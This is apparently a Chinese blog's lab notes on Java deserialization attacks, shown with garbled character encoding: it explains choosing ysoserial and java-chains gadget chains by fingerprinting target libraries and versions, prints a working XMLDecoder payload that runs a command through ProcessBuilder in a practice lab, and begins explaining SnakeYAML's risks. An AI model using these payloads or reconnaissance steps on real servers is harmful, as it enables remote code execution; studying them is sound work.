<p>åœ¨ Java ååºåˆ—åŒ–åˆ©ç”¨ä¸­ï¼Œé€‰æ‹©åˆé€‚çš„åˆ©ç”¨é“¾ï¼ˆGadget Chainï¼‰æ ¸å¿ƒåœ¨äº<strong>åŒ¹é…ç›®æ ‡ç¯å¢ƒçš„ä¾èµ–åº“ã€ç‰ˆæœ¬åŠåº”ç”¨ç‰¹æ€§</strong>ã€‚å·¥å…·ï¼ˆå¦‚ ysoserialã€marshalsec ç­‰ï¼‰åªæ˜¯ç”Ÿæˆå¯¹åº”é“¾çš„ payloadï¼Œèƒ½å¦æˆåŠŸåˆ©ç”¨å®Œå…¨å–å†³äºç›®æ ‡ç¯å¢ƒæ˜¯å¦æ»¡è¶³è¯¥é“¾çš„ â€œè§¦å‘æ¡ä»¶â€ã€‚ä»¥ä¸‹æ˜¯åˆ¤æ–­å’Œé€‰æ‹©åˆ©ç”¨é“¾çš„æ ¸å¿ƒæ€è·¯ï¼š</p>
<h3 id="ä¸€ã€æ ¸å¿ƒåˆ¤æ–­ä¾æ®ï¼šç›®æ ‡ç¯å¢ƒä¿¡æ¯"><a href="#ä¸€ã€æ ¸å¿ƒåˆ¤æ–­ä¾æ®ï¼šç›®æ ‡ç¯å¢ƒä¿¡æ¯" class="headerlink" title="ä¸€ã€æ ¸å¿ƒåˆ¤æ–­ä¾æ®ï¼šç›®æ ‡ç¯å¢ƒä¿¡æ¯"></a>ä¸€ã€æ ¸å¿ƒåˆ¤æ–­ä¾æ®ï¼šç›®æ ‡ç¯å¢ƒä¿¡æ¯</h3><p>ä»»ä½•åˆ©ç”¨é“¾çš„è§¦å‘éƒ½ä¾èµ–ç›®æ ‡ç¯å¢ƒä¸­å­˜åœ¨ç‰¹å®šçš„ç±»ï¼ˆé€šå¸¸æ¥è‡ªç¬¬ä¸‰æ–¹åº“ï¼‰ï¼Œä¸”è¿™äº›ç±»çš„ç‰ˆæœ¬æ”¯æŒé“¾çš„è°ƒç”¨é€»è¾‘ï¼ˆæœªè¢«ä¿®å¤ï¼‰ã€‚å› æ­¤ï¼Œ<strong>æ”¶é›†ç›®æ ‡ç¯å¢ƒä¿¡æ¯æ˜¯ç¬¬ä¸€æ­¥</strong>ã€‚</p>
<h4 id="1-ç¡®å®šç›®æ ‡ä½¿ç”¨çš„æ¡†æ¶-ä¾èµ–åº“"><a href="#1-ç¡®å®šç›®æ ‡ä½¿ç”¨çš„æ¡†æ¶-ä¾èµ–åº“" class="headerlink" title="1. ç¡®å®šç›®æ ‡ä½¿ç”¨çš„æ¡†æ¶ &#x2F; ä¾èµ–åº“"></a>1. ç¡®å®šç›®æ ‡ä½¿ç”¨çš„æ¡†æ¶ &#x2F; ä¾èµ–åº“</h4><p>ååºåˆ—åŒ–åˆ©ç”¨é“¾å‡ ä¹éƒ½ä¾èµ–ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚ Apache Commons Collectionsã€Jacksonã€ROME ç­‰ï¼‰ï¼Œæˆ–åº”ç”¨æœåŠ¡å™¨è‡ªå¸¦çš„åº“ï¼ˆå¦‚ WebLogicã€JBoss çš„å†…ç½®ç±»ï¼‰ã€‚éœ€é€šè¿‡ä»¥ä¸‹æ–¹å¼æ”¶é›†ï¼š</p>
<ul>
<li>æŒ‡çº¹è¯†åˆ«ï¼šé€šè¿‡åº”ç”¨å“åº”å¤´ã€é”™è¯¯é¡µé¢ï¼ˆå¦‚500é”™è¯¯æ ˆï¼‰ã€ç‰¹æ®Šè·¯å¾„ï¼ˆå¦‚&#x2F;META-INF&#x2F;maven&#x2F;ï¼‰è·å–ä¾èµ–ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼š<ul>
<li>é”™è¯¯æ ˆä¸­å‡ºç°<code>org.apache.commons.collections</code> â†’ å­˜åœ¨ Commons Collections åº“ï¼›</li>
<li>å“åº”å¤´åŒ…å«<code>X-Powered-By: JBoss</code> â†’ å¯èƒ½å­˜åœ¨ JBoss ç›¸å…³åº“ã€‚</li>
</ul>
</li>
<li><strong>æ–‡ä»¶æ³„éœ²</strong>ï¼šè‹¥èƒ½è·å–ç›®æ ‡çš„<code>WEB-INF/lib/</code>ç›®å½•ï¼ˆå¦‚é€šè¿‡ç›®å½•éå†æ¼æ´ï¼‰ï¼Œç›´æ¥æŸ¥çœ‹åŒ…å«çš„<code>jar</code>åŒ…ï¼ˆå¦‚<code>commons-collections-3.2.1.jar</code>ï¼‰ã€‚</li>
<li><strong>ä¸»åŠ¨æ¢æµ‹</strong>ï¼šç”¨æ— å±å®³çš„ â€œæ¢æµ‹é“¾â€ï¼ˆå¦‚ URLDNS é“¾ï¼‰æµ‹è¯•æ—¶ï¼Œç»“åˆç›®æ ‡æ˜¯å¦æœ‰ç‰¹å®šç±»çš„åŠ è½½è¡Œä¸ºï¼ˆéœ€é…åˆæ—¥å¿—æˆ–æµé‡åˆ†æï¼‰ã€‚</li>
</ul>
<h4 id="2-ç¡®è®¤ä¾èµ–åº“çš„ç‰ˆæœ¬"><a href="#2-ç¡®è®¤ä¾èµ–åº“çš„ç‰ˆæœ¬" class="headerlink" title="2. ç¡®è®¤ä¾èµ–åº“çš„ç‰ˆæœ¬"></a>2. ç¡®è®¤ä¾èµ–åº“çš„ç‰ˆæœ¬</h4><p>åŒä¸€åº“çš„ä¸åŒç‰ˆæœ¬å¯èƒ½æ”¯æŒä¸åŒçš„é“¾ã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li>Apache Commons Collectionsï¼š<ul>
<li>3.1~3.2.1 ç‰ˆæœ¬æ”¯æŒ<code>CommonsCollections1-7</code>ç­‰é“¾ï¼›</li>
<li>4.x ç‰ˆæœ¬ç§»é™¤äº†éƒ¨åˆ†å…³é”®ç±»ï¼ˆå¦‚<code>Transformer</code>ç›¸å…³ï¼‰ï¼ŒåŸé“¾å¤±æ•ˆï¼›</li>
</ul>
</li>
<li>Jacksonï¼š<ul>
<li>2.8.10 ä¹‹å‰çš„ç‰ˆæœ¬æ”¯æŒ<code>Jackson</code>é“¾ï¼Œé«˜ç‰ˆæœ¬ä¿®å¤äº†<code>@JsonTypeInfo</code>çš„ååºåˆ—åŒ–æ¼æ´ã€‚</li>
</ul>
</li>
</ul>
<p>éœ€é€šè¿‡ç‰ˆæœ¬å·ï¼ˆå¦‚<code>jar</code>åŒ…åä¸­çš„<code>3.2.1</code>ï¼‰æˆ–æ¼æ´åº“ï¼ˆå¦‚ CVEï¼‰ç¡®è®¤ç‰ˆæœ¬å…¼å®¹æ€§ã€‚</p>
<h4 id="3-åˆ†æç›®æ ‡åº”ç”¨ç±»å‹åŠé™åˆ¶"><a href="#3-åˆ†æç›®æ ‡åº”ç”¨ç±»å‹åŠé™åˆ¶" class="headerlink" title="3. åˆ†æç›®æ ‡åº”ç”¨ç±»å‹åŠé™åˆ¶"></a>3. åˆ†æç›®æ ‡åº”ç”¨ç±»å‹åŠé™åˆ¶</h4><ul>
<li><strong>åº”ç”¨æœåŠ¡å™¨ç±»å‹</strong>ï¼šWebLogicã€JBossã€Tomcat ç­‰æœ‰å„è‡ªä¸“å±çš„åˆ©ç”¨é“¾ï¼ˆå¦‚ WebLogic çš„<code>wls9_async</code>é“¾ï¼Œä¾èµ–å…¶å†…ç½®çš„<code>AsyncResponseService</code>ç±»ï¼‰ã€‚</li>
<li><strong>Java ç‰ˆæœ¬</strong>ï¼šé«˜ç‰ˆæœ¬ Javaï¼ˆå¦‚ 8u121+ã€9+ï¼‰å¼•å…¥äº†<code>serialFilter</code>ã€æ¨¡å—åŒ–é™åˆ¶ç­‰ï¼Œå¯èƒ½é˜»æ–­éƒ¨åˆ†é“¾ï¼ˆå¦‚<code>CommonsCollections1</code>åœ¨é«˜ç‰ˆæœ¬ Java ä¸­å¯èƒ½å› åå°„æƒé™è¢«ç¦è€Œå¤±æ•ˆï¼‰ã€‚</li>
<li><strong>å®‰å…¨ç®¡ç†å™¨ï¼ˆSecurityManagerï¼‰</strong>ï¼šè‹¥ç›®æ ‡å¯ç”¨äº†å®‰å…¨ç®¡ç†å™¨ï¼Œå¯èƒ½é™åˆ¶<code>Runtime.exec()</code>ç­‰å…³é”®æ“ä½œï¼Œéœ€é€‰æ‹©ç»•å¼€é™åˆ¶çš„é“¾ã€‚</li>
</ul>
<h3 id="äºŒã€å·¥å…·ä½¿ç”¨æ—¶çš„é“¾é€‰æ‹©é€»è¾‘"><a href="#äºŒã€å·¥å…·ä½¿ç”¨æ—¶çš„é“¾é€‰æ‹©é€»è¾‘" class="headerlink" title="äºŒã€å·¥å…·ä½¿ç”¨æ—¶çš„é“¾é€‰æ‹©é€»è¾‘"></a>äºŒã€å·¥å…·ä½¿ç”¨æ—¶çš„é“¾é€‰æ‹©é€»è¾‘</h3><p>ä»¥æœ€å¸¸ç”¨çš„<code>ysoserial</code>ä¸ºä¾‹ï¼Œå…¶å†…ç½®äº†æ•°åç§é“¾ï¼ˆå¦‚<code>CommonsCollections1</code>ã€<code>URLDNS</code>ã€<code>ROME</code>ç­‰ï¼‰ï¼Œé€‰æ‹©é€»è¾‘å¦‚ä¸‹ï¼š</p>
<h4 id="1-å…ˆç”¨-â€œæ— å±å®³æ¢æµ‹é“¾â€-éªŒè¯ååºåˆ—åŒ–æ¼æ´å­˜åœ¨"><a href="#1-å…ˆç”¨-â€œæ— å±å®³æ¢æµ‹é“¾â€-éªŒè¯ååºåˆ—åŒ–æ¼æ´å­˜åœ¨" class="headerlink" title="1. å…ˆç”¨ â€œæ— å±å®³æ¢æµ‹é“¾â€ éªŒè¯ååºåˆ—åŒ–æ¼æ´å­˜åœ¨"></a>1. å…ˆç”¨ â€œæ— å±å®³æ¢æµ‹é“¾â€ éªŒè¯ååºåˆ—åŒ–æ¼æ´å­˜åœ¨</h4><p>ä¼˜å…ˆä½¿ç”¨<strong>ä»…è§¦å‘ç½‘ç»œè¯·æ±‚æˆ–æ—¥å¿—è®°å½•</strong>çš„é“¾ï¼Œé¿å…å¯¹ç›®æ ‡é€ æˆå½±å“ï¼ŒåŒæ—¶éªŒè¯ååºåˆ—åŒ–å…¥å£æ˜¯å¦æœ‰æ•ˆã€‚ä¾‹å¦‚ï¼š</p>
<ul>
<li>URLDNS é“¾ï¼šè§¦å‘ç›®æ ‡å¯¹æŒ‡å®šåŸŸåçš„ DNS æŸ¥è¯¢ï¼ˆå¯é€šè¿‡ DNSlog å¹³å°ç›‘æµ‹ï¼‰ï¼Œé€‚ç”¨äºå‡ ä¹æ‰€æœ‰ç¯å¢ƒï¼ˆä»…ä¾èµ– JDK å†…ç½®ç±»ï¼‰ã€‚<ul>
<li>è‹¥ DNSlog æœ‰è®°å½• â†’ ç›®æ ‡å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå¯ç»§ç»­å°è¯•æ‰§è¡Œå‘½ä»¤çš„é“¾ï¼›</li>
<li>è‹¥æ— è®°å½• â†’ å¯èƒ½å…¥å£æ— æ•ˆï¼Œæˆ–è¢«åºåˆ—åŒ–è¿‡æ»¤æ‹¦æˆªã€‚</li>
</ul>
</li>
</ul>
<h4 id="2-æ ¹æ®ä¾èµ–åº“åŒ¹é…å¯æ‰§è¡Œå‘½ä»¤çš„é“¾"><a href="#2-æ ¹æ®ä¾èµ–åº“åŒ¹é…å¯æ‰§è¡Œå‘½ä»¤çš„é“¾" class="headerlink" title="2. æ ¹æ®ä¾èµ–åº“åŒ¹é…å¯æ‰§è¡Œå‘½ä»¤çš„é“¾"></a>2. æ ¹æ®ä¾èµ–åº“åŒ¹é…å¯æ‰§è¡Œå‘½ä»¤çš„é“¾</h4><p>ç¡®è®¤æ¼æ´å­˜åœ¨åï¼Œæ ¹æ®æ”¶é›†åˆ°çš„ä¾èµ–åº“ä¿¡æ¯ï¼Œé€‰æ‹©å¯¹åº”çš„é“¾ï¼š</p>
<ul>
<li><strong>è‹¥å­˜åœ¨ Apache Commons Collectionsï¼ˆ3.xï¼‰</strong>ï¼šä¼˜å…ˆå°è¯•<code>CommonsCollections1</code>ï¼ˆæœ€ç»å…¸ï¼Œå…¼å®¹æ€§å¹¿ï¼‰ï¼›è‹¥å¤±è´¥ï¼Œä¾æ¬¡æµ‹è¯•<code>CommonsCollections2-7</code>ï¼ˆé’ˆå¯¹ä¸åŒè°ƒç”¨è·¯å¾„ï¼‰ã€‚</li>
<li><strong>è‹¥å­˜åœ¨ ROME åº“</strong>ï¼šä½¿ç”¨<code>ROME</code>é“¾ï¼ˆä¾èµ–<code>rome-1.0.jar</code>ä¸­çš„<code>ObjectBean</code>ç±»ï¼‰ã€‚</li>
<li><strong>è‹¥å­˜åœ¨ Jackson åº“ï¼ˆä½ç‰ˆæœ¬ï¼‰</strong>ï¼šä½¿ç”¨<code>Jackson</code>é“¾ï¼ˆåˆ©ç”¨<code>@JsonTypeInfo</code>ååºåˆ—åŒ–ä»»æ„ç±»ï¼‰ã€‚</li>
<li><strong>è‹¥ä¸º WebLogic æœåŠ¡å™¨</strong>ï¼šå°è¯•<code>wls9_async</code>ã€<code>wls10</code>ç­‰ä¸“å±é“¾ï¼ˆä¾èµ– WebLogic çš„<code>weblogic.jms.common.StreamMessageImpl</code>ç­‰ç±»ï¼‰ã€‚</li>
</ul>
<h4 id="3-æ’é™¤æ³•ï¼šä»-â€œé«˜å…¼å®¹æ€§â€-åˆ°-â€œä¸“å±é“¾â€"><a href="#3-æ’é™¤æ³•ï¼šä»-â€œé«˜å…¼å®¹æ€§â€-åˆ°-â€œä¸“å±é“¾â€" class="headerlink" title="3. æ’é™¤æ³•ï¼šä» â€œé«˜å…¼å®¹æ€§â€ åˆ° â€œä¸“å±é“¾â€"></a>3. æ’é™¤æ³•ï¼šä» â€œé«˜å…¼å®¹æ€§â€ åˆ° â€œä¸“å±é“¾â€</h4><p>è‹¥ç¯å¢ƒä¿¡æ¯ä¸æ˜ç¡®ï¼Œå¯æŒ‰ä»¥ä¸‹é¡ºåºæµ‹è¯•ï¼ˆå…¼å®¹æ€§ä»é«˜åˆ°ä½ï¼‰ï¼š</p>
<ol>
<li><strong>JDK å†…ç½®ç±»é“¾</strong>ï¼šå¦‚<code>URLDNS</code>ï¼ˆæ¢æµ‹ç”¨ï¼‰ã€<code>Jdk7u21</code>ï¼ˆä¾èµ– JDK 7u21 åŠä»¥ä¸‹çš„<code>sun.rmi.server.UnicastRef</code>ç±»ï¼‰ã€‚</li>
<li><strong>é«˜æµè¡Œåº¦åº“é“¾</strong>ï¼šå¦‚<code>CommonsCollections1</code>ï¼ˆApache Commons Collections åº”ç”¨æå¹¿ï¼‰ã€<code>Log4j</code>ï¼ˆè‹¥å­˜åœ¨ç‰¹å®šç‰ˆæœ¬ï¼‰ã€‚</li>
<li><strong>åº”ç”¨æœåŠ¡å™¨ä¸“å±é“¾</strong>ï¼šå¦‚ WebLogicã€JBossã€Jenkins ç­‰å„è‡ªçš„é“¾ã€‚</li>
<li><strong>å°ä¼—åº“é“¾</strong>ï¼šå¦‚<code>C3P0</code>ã€<code>JBossInterceptors</code>ç­‰ï¼ˆä»…å½“ç¡®è®¤ç›®æ ‡å­˜åœ¨å¯¹åº”åº“æ—¶å°è¯•ï¼‰ã€‚</li>
</ol>
<h3 id="ä¸‰ã€å…¸å‹åœºæ™¯ç¤ºä¾‹"><a href="#ä¸‰ã€å…¸å‹åœºæ™¯ç¤ºä¾‹" class="headerlink" title="ä¸‰ã€å…¸å‹åœºæ™¯ç¤ºä¾‹"></a>ä¸‰ã€å…¸å‹åœºæ™¯ç¤ºä¾‹</h3><ul>
<li><strong>åœºæ™¯ 1</strong>ï¼šç›®æ ‡é”™è¯¯é¡µæ˜¾ç¤º<code>org.apache.commons.collections.map.LazyMap</code> â†’ å­˜åœ¨ Commons Collections 3.x â†’ ä¼˜å…ˆç”¨<code>CommonsCollections1</code>ã€‚</li>
<li><strong>åœºæ™¯ 2</strong>ï¼šç›®æ ‡æ˜¯ WebLogic 10.3.6 â†’ å°è¯•<code>wls9_async</code>é“¾ï¼ˆWebLogic ä¸“å±ï¼Œæ— éœ€ç¬¬ä¸‰æ–¹åº“ï¼‰ã€‚</li>
<li><strong>åœºæ™¯ 3</strong>ï¼šç›®æ ‡ Java ç‰ˆæœ¬ä¸º 8u200+ â†’ é¿å¼€<code>CommonsCollections1</code>ï¼ˆå¯èƒ½å› åå°„é™åˆ¶å¤±æ•ˆï¼‰ï¼Œå°è¯•<code>Groovy</code>é“¾ï¼ˆè‹¥å­˜åœ¨ Groovy åº“ï¼‰ã€‚</li>
</ul>
<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ ¸å¿ƒé€»è¾‘ï¼š<strong>â€œç¯å¢ƒå†³å®šé“¾â€</strong>ã€‚å…ˆé€šè¿‡å„ç§æ–¹å¼æ”¶é›†ç›®æ ‡çš„ä¾èµ–åº“ã€ç‰ˆæœ¬ã€åº”ç”¨ç±»å‹ç­‰ä¿¡æ¯ï¼Œå†å¯¹ç…§å·¥å…·ä¸­é“¾çš„ â€œä¾èµ–æ¡ä»¶â€ï¼ˆå¯æŸ¥çœ‹ ysoserial æºç ä¸­å„é“¾çš„å®ç°ï¼Œäº†è§£å…¶ä¾èµ–çš„ç±»ï¼‰ï¼Œæœ€ç»ˆåŒ¹é…å‡ºå¯èƒ½æœ‰æ•ˆçš„é“¾ã€‚è‹¥ä¿¡æ¯ä¸è¶³ï¼Œä»é«˜å…¼å®¹æ€§é“¾å¼€å§‹é€æ­¥æµ‹è¯•ï¼Œç»“åˆæ‰§è¡Œç»“æœï¼ˆå¦‚å‘½ä»¤å›æ˜¾ã€æ–‡ä»¶å†™å…¥ã€DNSlogï¼‰éªŒè¯æœ‰æ•ˆæ€§ã€‚</p>
</blockquote>
<p>-<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a>    ç»å…¸å·¥å…·</p>
<p>-<a target="_blank" rel="noopener" href="https://github.com/vulhub/java-chains">https://github.com/vulhub/java-chains</a>   æœ¬æ¬¡ä½¿ç”¨</p>
<h4 id="Java-chains"><a href="#Java-chains" class="headerlink" title="Java-chains"></a>Java-chains</h4><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/java-chains">https://github.com/vulhub/java-chains</a> </p>
<p>éƒ¨ç½²æŒ‰ç…§æ•™ç¨‹éƒ¨ç½²</p>
<p>ä½¿ç”¨</p>
<p><img src="/./images/image-20250817232105941.png" alt="image-20250817232105941"></p>
<p>å°†ç”Ÿæˆçš„payloadå¤åˆ¶åˆ°é¶åœºä¸­ï¼Œä¹Ÿå¯ä»¥å¼¹å‡ºè®¡ç®—å™¨</p>
<h3 id="xmldecoder"><a href="#xmldecoder" class="headerlink" title="xmldecoder"></a>xmldecoder</h3><p>åœ¨é¶åœºä¸­ç›´æ¥è¾“å…¥æ‰§è¡Œçš„å‘½ä»¤å°±å¯ä»¥æ‰§è¡Œäº†</p>
<p><img src="/./images/image-20250818203553496.png" alt="image-20250818203553496"></p>
<p>åŸç†å‰–æ</p>
<blockquote>
<h3 id="ä¸€ã€ä»£ç å¯¹æ•°æ®åŒ…çš„å¤„ç†æµç¨‹"><a href="#ä¸€ã€ä»£ç å¯¹æ•°æ®åŒ…çš„å¤„ç†æµç¨‹" class="headerlink" title="ä¸€ã€ä»£ç å¯¹æ•°æ®åŒ…çš„å¤„ç†æµç¨‹"></a>ä¸€ã€ä»£ç å¯¹æ•°æ®åŒ…çš„å¤„ç†æµç¨‹</h3><p>å½“æµè§ˆå™¨å‘é€<code>GET /home/deserialize/xmldecoder?cmd=calc HTTP/1.1</code>è¯·æ±‚åï¼Œä»£ç çš„æ‰§è¡Œæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li><p><strong>æ¥æ”¶ç”¨æˆ·è¾“å…¥</strong>ï¼š<br>æ§åˆ¶å™¨æ–¹æ³•<code>xmlDecoder</code>é€šè¿‡<code>String cmd</code>å‚æ•°è·å– URL ä¸­<code>cmd=calc</code>çš„å€¼ï¼ˆå³ç”¨æˆ·è¾“å…¥çš„<code>calc</code>ï¼‰ã€‚</p>
</li>
<li><p><strong>æ„å»ºæ¶æ„ XML</strong>ï¼š<br>ä»£ç å°†<code>cmd</code>æŒ‰ç©ºæ ¼åˆ†å‰²ä¸ºå­—ç¬¦ä¸²æ•°ç»„ï¼ˆè¿™é‡Œ<code>cmd=calc</code>åˆ†å‰²åä¸º<code>[&quot;calc&quot;]</code>ï¼‰ï¼Œç„¶ååŠ¨æ€æ‹¼æ¥æˆä¸€ä¸ª XML æ–‡æ¡£ï¼š</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">&quot;1.8.0_151&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ª XML çš„å«ä¹‰æ˜¯ï¼šåˆ›å»ºä¸€ä¸ª<code>ProcessBuilder</code>å¯¹è±¡ï¼Œä¼ å…¥å‚æ•°<code>[&quot;calc&quot;]</code>ï¼Œå¹¶è°ƒç”¨å…¶<code>start()</code>æ–¹æ³•ï¼ˆç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼‰ã€‚</p>
</li>
<li><p><strong>XML ååºåˆ—åŒ–æ‰§è¡Œ</strong>ï¼š<br>ä»£ç ä½¿ç”¨<code>java.beans.XMLDecoder</code>è§£æä¸Šè¿° XMLï¼š</p>
<ul>
<li>é€šè¿‡<code>ByteArrayInputStream</code>å°† XML å­—ç¬¦ä¸²è½¬ä¸ºè¾“å…¥æµï¼›</li>
<li>è°ƒç”¨<code>xmlDecoder.readObject()</code>æ–¹æ³•ï¼Œè§¦å‘ XML ååºåˆ—åŒ–è¿‡ç¨‹ï¼›</li>
<li><code>XMLDecoder</code>ä¼šæŒ‰ç…§ XML å®šä¹‰ï¼Œå®ä¾‹åŒ–<code>ProcessBuilder</code>å¯¹è±¡å¹¶æ‰§è¡Œ<code>start()</code>æ–¹æ³•ï¼Œæœ€ç»ˆåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œ<code>calc</code>å‘½ä»¤ï¼ˆæ‰“å¼€è®¡ç®—å™¨ï¼‰ã€‚</li>
</ul>
</li>
<li><p><strong>è¿”å›ç»“æœ</strong>ï¼š<br>æ— è®ºæˆåŠŸæˆ–å¤±è´¥ï¼Œéƒ½ä¼šå°†ç»“æœï¼ˆå¦‚ â€œæ‰§è¡ŒæˆåŠŸâ€ æˆ–å¼‚å¸¸ä¿¡æ¯ï¼‰é€šè¿‡<code>model</code>ä¼ é€’åˆ°å‰ç«¯é¡µé¢å±•ç¤ºã€‚</p>
</li>
</ol>
</blockquote>
<h3 id="SnakeYaml"><a href="#SnakeYaml" class="headerlink" title="SnakeYaml"></a>SnakeYaml</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><blockquote>
<p>SnakeYAML æ˜¯ Java ä¸­å¸¸ç”¨çš„ YAML æ ¼å¼è§£æåº“ï¼Œå…¶ååºåˆ—åŒ–åŠŸèƒ½ç”¨äºå°† YAML æ–‡æ¡£è½¬æ¢ä¸º Java å¯¹è±¡ã€‚ä½†åœ¨é»˜è®¤é…ç½®ä¸‹ï¼ŒSnakeYAML çš„ååºåˆ—åŒ–å­˜åœ¨å®‰å…¨é£é™©ï¼Œå¯èƒ½è¢«æ”»å‡»è€…åˆ©ç”¨æ‰§è¡Œæ¶æ„ä»£ç ã€‚å…¶æ ¸å¿ƒåŸç†å¯åˆ†ä¸º<strong>æ­£å¸¸è§£ææµç¨‹</strong>å’Œ<strong>å®‰å…¨é£é™©æˆå› </strong>ä¸¤éƒ¨åˆ†ï¼š</p>
<h3 id="ä¸€ã€SnakeYAML-ååºåˆ—åŒ–çš„æ­£å¸¸æµç¨‹"><a href="#ä¸€ã€SnakeYAML-ååºåˆ—åŒ–çš„æ­£å¸¸æµç¨‹" class="headerlink" title="ä¸€ã€SnakeYAML ååºåˆ—åŒ–çš„æ­£å¸¸æµç¨‹"></a>ä¸€ã€SnakeYAML ååºåˆ—åŒ–çš„æ­£å¸¸æµç¨‹</h3><p>SnakeYAML çš„ååºåˆ—åŒ–æœ¬è´¨æ˜¯ â€œæ ¹æ® YAML æ–‡æ¡£çš„æè¿°ï¼Œå®ä¾‹åŒ–å¹¶ç»„è£… Java å¯¹è±¡â€ï¼Œæ ¸å¿ƒæ­¥éª¤å¦‚ä¸‹ï¼š</p>
<ol>
<li><p><strong>è§£æ YAML æ–‡æ¡£</strong><br>å½“è°ƒç”¨<code>Yaml.load()</code>ï¼ˆæˆ–<code>loadAs()</code>ç­‰æ–¹æ³•ï¼‰æ—¶ï¼ŒSnakeYAML é¦–å…ˆä¼šè§£æè¾“å…¥çš„ YAML å­—ç¬¦ä¸²ï¼Œè¯†åˆ«å…¶ä¸­çš„<strong>æ•°æ®ç»“æ„</strong>ï¼ˆå¦‚æ˜ å°„ã€åˆ—è¡¨ã€æ ‡é‡ï¼‰å’Œ<strong>ç±»å‹æ ‡ç­¾</strong>ï¼ˆç”¨äºæŒ‡å®š Java ç±»ï¼‰ã€‚<br>YAML ä¸­é€šè¿‡<code>!!</code>æ ‡ç­¾æŒ‡å®šè¦å®ä¾‹åŒ–çš„ Java ç±»ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">!!java.util.HashMap</span></span><br><span class="line"><span class="attr">key:</span> <span class="string">value</span></span><br></pre></td></tr></table></figure>

<p>è¡¨ç¤º â€œååºåˆ—åŒ–ä¸ºä¸€ä¸ª<code>java.util.HashMap</code>å¯¹è±¡ï¼Œå…¶é”®å€¼å¯¹ä¸º<code>key: value</code>â€ã€‚</p>
</li>
<li><p><strong>é€šè¿‡ Constructor åˆ›å»ºå¯¹è±¡</strong><br>SnakeYAML çš„<code>Constructor</code>ç±»æ˜¯ååºåˆ—åŒ–çš„æ ¸å¿ƒç»„ä»¶ï¼Œè´Ÿè´£å°†è§£æåçš„ YAML èŠ‚ç‚¹è½¬æ¢ä¸º Java å¯¹è±¡ï¼š</p>
<ul>
<li>å¯¹äºåŸºæœ¬ç±»å‹ï¼ˆå¦‚å­—ç¬¦ä¸²ã€æ•°å­—ï¼‰æˆ–ç®€å•é›†åˆï¼ˆå¦‚<code>List</code>ã€<code>Map</code>ï¼‰ï¼Œ<code>Constructor</code>ä¼šç›´æ¥åˆ›å»ºå¯¹åº”å®ä¾‹å¹¶èµ‹å€¼ï¼›</li>
<li>å¯¹äºè‡ªå®šä¹‰ç±»æˆ–å¤æ‚ç±»å‹ï¼ŒConstructorä¼šï¼š<ol>
<li>æ ¹æ® YAML ä¸­çš„ç±»åï¼ˆå¦‚<code>!!com.example.User</code>ï¼‰é€šè¿‡åå°„æ‰¾åˆ°å¯¹åº”çš„ Java ç±»ï¼›</li>
<li>è°ƒç”¨è¯¥ç±»çš„æ„é€ æ–¹æ³•ï¼ˆé»˜è®¤ä¼˜å…ˆæ— å‚æ„é€ ï¼Œä¹Ÿæ”¯æŒæœ‰å‚æ„é€ ï¼‰å®ä¾‹åŒ–å¯¹è±¡ï¼›</li>
<li>è§£æ YAML ä¸­çš„å±æ€§ï¼ˆå¦‚<code>name: &quot;test&quot;</code>ï¼‰ï¼Œé€šè¿‡åå°„è®¾ç½®å¯¹è±¡çš„å­—æ®µå€¼ï¼ˆæˆ–è°ƒç”¨ setter æ–¹æ³•ï¼‰ã€‚</li>
</ol>
</li>
</ul>
</li>
